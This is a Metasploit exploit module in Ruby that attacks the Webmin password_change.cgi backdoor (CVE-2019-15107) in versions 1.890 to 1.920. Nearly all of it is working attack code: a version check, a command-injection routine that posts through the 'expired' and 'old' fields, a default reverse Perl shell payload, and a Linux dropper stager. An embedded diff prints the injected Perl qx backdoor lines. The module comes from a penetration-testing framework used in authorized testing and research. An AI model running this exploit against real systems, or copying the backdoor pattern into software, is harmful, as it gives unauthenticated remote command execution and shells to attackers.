# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;               => &#039;Webmin password_change.cgi Backdoor&#039;,
      &#039;Description&#039;        => %q{
        This module exploits a backdoor in Webmin versions 1.890 through 1.920.
        Only the SourceForge downloads were backdoored, but they are listed as
        official downloads on the project&#039;s site.

        Unknown attacker(s) inserted Perl qx statements into the build server&#039;s
        source code on two separate occasions: once in April 2018, introducing
        the backdoor in the 1.890 release, and in July 2018, reintroducing the
        backdoor in releases 1.900 through 1.920.

        Only version 1.890 is exploitable in the default install. Later affected
        versions require the expired password changing feature to be enabled.
      },
      &#039;Author&#039;             => [
        &#039;AkkuS&#039;, # (Özkan Mustafa Akkuş) Discovery and independent module
        &#039;wvu&#039;    # This module and updated information about the backdoor
      ],
      &#039;References&#039;         => [
        [&#039;CVE&#039;, &#039;2019-15107&#039;], # y tho
        [&#039;URL&#039;, &#039;http://www.webmin.com/exploit.html&#039;],
        [&#039;URL&#039;, &#039;https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html&#039;],
        [&#039;URL&#039;, &#039;https://blog.firosolutions.com/exploits/webmin/&#039;],
        [&#039;URL&#039;, &#039;https://github.com/webmin/webmin/issues/947&#039;]
      ],
      &#039;DisclosureDate&#039;     => &#039;2019-08-10&#039;,
      &#039;License&#039;            => MSF_LICENSE,
      &#039;Platform&#039;           => [&#039;unix&#039;, &#039;linux&#039;],
      &#039;Arch&#039;               => [ARCH_CMD, ARCH_X86, ARCH_X64],
      &#039;Privileged&#039;         => true,
      &#039;Targets&#039;            => [
        [&#039;Automatic (Unix In-Memory)&#039;,
          &#039;Platform&#039;       => &#039;unix&#039;,
          &#039;Arch&#039;           => ARCH_CMD,
          &#039;Version&#039;        => [
            Gem::Version.new(&#039;1.890&#039;), Gem::Version.new(&#039;1.920&#039;)
          ],
          &#039;Type&#039;           => :unix_memory,
          &#039;DefaultOptions&#039; => {&#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_perl&#039;}
        ],
        [&#039;Automatic (Linux Dropper)&#039;,
          &#039;Platform&#039;       => &#039;linux&#039;,
          &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
          &#039;Version&#039;        => [
            Gem::Version.new(&#039;1.890&#039;), Gem::Version.new(&#039;1.920&#039;)
          ],
          &#039;Type&#039;           => :linux_dropper,
        ]
      ],
      &#039;DefaultTarget&#039;      => 0,
      &#039;Notes&#039;              => {
        &#039;Stability&#039;        => [CRASH_SAFE],
        &#039;Reliability&#039;      => [REPEATABLE_SESSION],
        &#039;SideEffects&#039;      => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
      }
    ))

    register_options([
      Opt::RPORT(10000),
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Base path to Webmin&#039;, &#039;/&#039;])
    ])

    register_advanced_options([
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false])
    ])
  end

  def check
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path)
    )

    unless res
      vprint_error(&#039;Server did not respond&#039;)
      return CheckCode::Unknown
    end

    version =
      res.headers[&#039;Server&#039;].to_s.scan(%r{MiniServ/([\d.]+)}).flatten.first

    unless version
      vprint_error(&#039;Webmin version not detected&#039;)
      return CheckCode::Unknown
    end

    version = Gem::Version.new(version)

    vprint_status("Webmin #{version} detected")
    checkcode = CheckCode::Detected

    unless version.between?(*target[&#039;Version&#039;])
      vprint_error("Webmin #{version} is not a supported target")
      return CheckCode::Safe
    end

    vprint_good("Webmin #{version} is a supported target")
    checkcode = CheckCode::Appears

    res = execute_command("echo #{token}")

    unless res
      vprint_error(&#039;Webmin did not respond to check command&#039;)
      return checkcode
    end

    if res.body.include?(&#039;Password changing is not enabled!&#039;)
      vprint_error(&#039;Expired password changing disabled&#039;)
      return CheckCode::Safe
    end

    if res.body.include?(token)
      vprint_good(&#039;Webmin executed a benign check command&#039;)
      checkcode = CheckCode::Vulnerable
    else
      vprint_error(&#039;Webmin did not execute our check command&#039;)
      return CheckCode::Safe
    end

    checkcode
  end

  def exploit
    # These CheckCodes are allowed to pass automatically
    checkcodes = [
      CheckCode::Appears,
      CheckCode::Vulnerable
    ]

    unless checkcodes.include?(check) || datastore[&#039;ForceExploit&#039;]
      fail_with(Failure::NotVulnerable, &#039;Set ForceExploit to override&#039;)
    end

    print_status("Configuring #{target.name} target")

    case target[&#039;Type&#039;]
    when :unix_memory
      print_status("Sending #{datastore[&#039;PAYLOAD&#039;]} command payload")
      vprint_status("Generated command payload: #{payload.encoded}")

      res = execute_command(payload.encoded)

      if res && datastore[&#039;PAYLOAD&#039;] == &#039;cmd/unix/generic&#039;
        print_warning(&#039;Dumping command output in full response body&#039;)

        if res.body.empty?
          print_error(&#039;Empty response body, no command output&#039;)
          return
        end

        print_line(res.body)
      end
    when :linux_dropper
      print_status("Sending #{datastore[&#039;PAYLOAD&#039;]} command stager")
      execute_cmdstager
    end
  end

=begin
wvu@kharak:~/Downloads$ diff3 webmin-1.{890,930,920}/password_change.cgi
====2
1:1c
3:1c
  #!/usr/bin/perl
2:1c
  #!/usr/local/bin/perl
====1
1:12c
  $in{&#039;expired&#039;} eq &#039;&#039; || die $text{&#039;password_expired&#039;},qx/$in{&#039;expired&#039;}/;
2:12c
3:12c
  $miniserv{&#039;passwd_mode&#039;} == 2 || die "Password changing is not enabled!";
====3
1:40c
2:40c
    $enc eq $wuser->{&#039;pass&#039;} || &pass_error($text{&#039;password_eold&#039;});
3:40c
    $enc eq $wuser->{&#039;pass&#039;} || &pass_error($text{&#039;password_eold&#039;},qx/$in{&#039;old&#039;}/);
====3
1:200c
2:200c
  # Show ok page
3:200c

wvu@kharak:~/Downloads$
=end
  def execute_command(cmd, _opts = {})
    send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;password_change.cgi&#039;),
      &#039;headers&#039;   => {&#039;Referer&#039; => full_uri},
      &#039;vars_post&#039; => {
        # 1.890
        &#039;expired&#039; => cmd,
        # 1.900-1.920
        &#039;new1&#039;    => token,
        &#039;new2&#039;    => token,
        &#039;old&#039;     => cmd
      }
    }, 3.5)
  end

  def token
    @token ||= Rex::Text.rand_text_alphanumeric(8..42)
  end

end

